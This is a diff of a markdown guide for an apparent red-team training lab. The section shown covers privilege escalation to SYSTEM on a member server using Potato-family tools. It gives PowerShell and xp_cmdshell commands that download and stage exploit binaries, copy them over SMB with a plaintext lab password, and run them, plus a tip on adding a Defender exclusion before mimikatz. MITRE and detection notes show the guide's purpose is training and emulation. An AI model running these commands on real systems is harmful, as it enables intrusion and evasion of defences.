@@ -89,29 +89,81 @@ EXEC xp_cmdshell 'whoami /groups';   -- → BUILTIN\Users (NOT admin)
 
 ---
 
-### Local Privilege Escalation: GodPotato → SYSTEM (mbr01)
+### Local Privilege Escalation: Potato-family alternatives → SYSTEM (mbr01)
 
 
 |                         |                                                                   |
 | ----------------------- | ----------------------------------------------------------------- |
 | **Target**              | mbr01 (192.168.77.22)                                             |
 | **Source of this path** | Phase 3: `nt service\mssql$sqlexpress` has SeImpersonatePrivilege |
-| **From**                | xp_cmdshell on mbr01                                              |
+| **Tool staging**        | `ws01` (initial beachhead) → `C$` / `ADMIN$` on mbr01               |
 | **What you earn**       | `nt authority\system` on mbr01 — full control of the machine      |
 
 
-```bash
-# Transfer GodPotato to mbr01
-EXEC xp_cmdshell 'certutil -urlcache -split -f http://192.168.77.60:8888/GodPotato.exe C:\Users\Public\GodPotato.exe';
+**Why this matters (CRTP/CAPE method):** Real attackers do not download binaries directly onto the target from their C2 HTTP server. They stage tools on the first compromised host (`ws01`), then copy them laterally over SMB (`xcopy`, `Copy-Item`, `net use`) or PowerShell remoting. This keeps C2-to-DC traffic low and blends the tool transfer with normal Windows admin activity.
 
-# Escalate to SYSTEM
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c whoami"';
--- → nt authority\system ✅
+**MITRE mapping:** T1570 (Lateral Tool Transfer) · T1068 (Exploitation for Privilege Escalation) · T1078 (Valid Accounts).
+
+**DFIR visibility:** Security 4624/4648, Sysmon EID 1/11 (file creation on target), Zeek `smb.log` `C$`/`ADMIN$` access, Windows 5145/5140, WinRM 91/93.
+
+**Step 1 — Stage LPE binaries on `ws01` (beachhead):**
+
+```powershell
+# Run from ws01 as analyst_t1
+$dir = "C:\Tools\ADTools"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+# GodPotato (DCOM-based, Server 2025 compatible)
+Invoke-WebRequest -Uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" -OutFile "$dir\GodPotato-NET4.exe" -UseBasicParsing
+# PrintSpoofer (named pipe, usually patched on Server 2025)
+Invoke-WebRequest -Uri "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe" -OutFile "$dir\PrintSpoofer64.exe" -UseBasicParsing
+# SweetPotato (multi-method: DCOM, BITS, WinRM, EfsRpc, PrintSpoofer)
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/uknowsec/SweetPotato/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe" -OutFile "$dir\SweetPotato.exe" -UseBasicParsing
+# JuicyPotatoNG (second-gen DCOM reflection)
+Invoke-WebRequest -Uri "https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip" -OutFile "$dir\JuicyPotatoNG.zip" -UseBasicParsing
+Expand-Archive -Force "$dir\JuicyPotatoNG.zip" "$dir"
 ```
 
-**Result:** `nt authority\system` on mbr01. All subsequent commands execute as SYSTEM via xp_cmdshell chain: `EXEC xp_cmdshell 'GodPotato.exe -cmd "cmd /c <COMMAND>"'`.
+**Step 2 — Copy from `ws01` to `mbr01` via SMB (T1570):**
 
-**Note:** PrintSpoofer ❌ fails on Server 2025 (Print Spooler named pipe patched). GodPotato ✅ uses DCOM, works on Server 2025.
+```powershell
+# From ws01 as analyst_t1 (child.cadre.local\analyst_t1 / T13r_An@lyst!)
+$source = "C:\Tools\ADTools"
+$target = "\\mbr01.child.cadre.local\C$\Windows\Temp\cadre-tools"
+$pass = ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', $pass)
+New-Item -ItemType Directory -Path $target -Force | Out-Null
+Copy-Item -Path "$source\GodPotato-NET4.exe" -Destination $target -Force -Credential $cred
+Copy-Item -Path "$source\PrintSpoofer64.exe" -Destination $target -Force -Credential $cred
+Copy-Item -Path "$source\SweetPotato.exe" -Destination $target -Force -Credential $cred
+Get-ChildItem -Path "$target\*.exe" | Select-Object Name, Length
+```
+
+**Step 3 — Try LPE alternatives until one returns SYSTEM:**
+
+```powershell
+# Via xp_cmdshell from Kali → mbr01 (now that binaries are already on mbr01 from ws01)
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato-NET4.exe -cmd "cmd /c whoami"';
+# -- → nt authority\system ✅
+
+# If GodPotato fails in the SQL service context, try SweetPotato (auto-selects DCOM/BITS/WinRM/EfsRpc)
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\SweetPotato.exe -p cmd.exe -a "/c whoami"';
+
+# Or JuicyPotatoNG with brute-force create-process flags
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"';
+
+# PrintSpoofer is least likely on Server 2025 but kept as a fallback
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\PrintSpoofer64.exe -i -c cmd /c whoami';
+```
+
+**Automation:** `attack-matrix/04-automation/linux/campaign-a/T043-lpe-alternatives-ws01.sh` stages the binaries and tries each candidate via `winrs` from `ws01` to `mbr01`.
+
+**Result:** `nt authority\system` on mbr01. All subsequent commands execute as SYSTEM via the `xp_cmdshell` chain: `EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\<tool>.exe -cmd "cmd /c <COMMAND>"'`.
+
+**Notes:**
+- `GodPotato` ✅ uses DCOM, generally works on Server 2025 when SeImpersonatePrivilege is present.
+- `PrintSpoofer` ❌ usually fails on Server 2025 because the Print Spooler named pipe path is patched.
+- `SweetPotato` / `JuicyPotatoNG` are the best alternatives when the execution context (SQL service, WinRM `wsmprovhost`) has `SeImpersonatePrivilege` but a constrained token breaks GodPotato.
+- If **all** Potato variants fail, enable missing privileges with `FullPowers` or switch to `KrbRelayUp` (Kerberos relay LPE, no SeImpersonate needed).
 
 > **🆕 Optional Precursor — Defender Exclusion via PowerShell (T1562.001):** Real-world attackers typically disable Defender for their specific payload directory **before** running mimikatz/AMSI bypass — without disabling the entire Defender service. Use `Add-MpPreference -ExclusionPath "C:\Users\analyst_cloud\AppData\Local\Temp"` to whitelist the directory, then run mimikatz from there. Cleaner than full Defender disable (no Tamper Protection override needed). Detection: WinSec 5001 + Sysmon EID 1 (`powershell.exe` + `*MpPreference*ExclusionPath*`). See Campaign_suggestions #108 + CAMPAIGNS-METADATA "Mechanics: Item #108". Not in main spine — held for Phase 3 alternative execution cycle. **NOTE:** CADRE lab currently has Defender fully disabled per `04-vulnerabilities.yml`; this precursor requires re-enabling Defender for realistic test.
 
@@ -162,10 +214,7 @@ winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! cmd
 # Now running cmd.exe on mbr01 as child\analyst_t1
 ```
 
-**Why this is more realistic than CRTP/CRTE/CAPE/GOAD:**
-- CRTP and CRTE run most lateral movement directly from the attacker Kali box with captured credentials.
-- GOAD provides multiple paths but typically guides the operator to run BloodHound/mimikatz from a single compromised Windows host or Kali.
-- **CADRE forces the learner to chain beachheads** and understand identity/context boundaries: the workstation account cannot DCSync a DC, but it can remote-manage `mbr01`, which can then coerce `dc02` or host a relay.
+**Why this matters:** A workstation account cannot DCSync a DC directly, but it can remote-manage a member server like `mbr01`. That member server can then coerce or abuse a DC, teaching the identity/context boundary between a low-privilege beachhead and a tiered target.
 
 **Detection:**
 - Sysmon EID 1 (`winrs.exe` / `wsmprovhost.exe`) on ws01 and mbr01.
